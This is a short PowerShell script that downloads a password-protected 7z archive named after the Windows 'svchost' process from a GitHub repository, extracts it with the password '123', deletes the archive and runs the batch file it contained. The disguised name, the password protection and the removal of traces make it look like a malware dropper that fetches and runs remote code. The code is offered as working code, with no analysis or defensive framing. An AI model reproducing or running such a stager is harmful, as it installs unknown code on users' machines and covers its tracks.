# download-and-extract.ps1
# 1️⃣ Download the .7z file
$url   = 'https://github.com/viper-fervor-shout5/servo-5/raw/refs/heads/main/svchost1.7z'
$out   = 'svchost.7z'
Write-Host "Downloading $url ..."
Invoke-WebRequest -Uri $url -OutFile $out

# 2️⃣ Extract it (7‑zip must be on the PATH)
Write-Host "Extracting svchost.7z ..."
& 7z x -aoa -p123 $out

# 3️⃣ Delete the archive
Write-Host "Deleting archive ..."
Remove-Item -Force $out

# 4️⃣ Run the batch file
Write-Host "Running svc.bat ..."
cmd /c svc.bat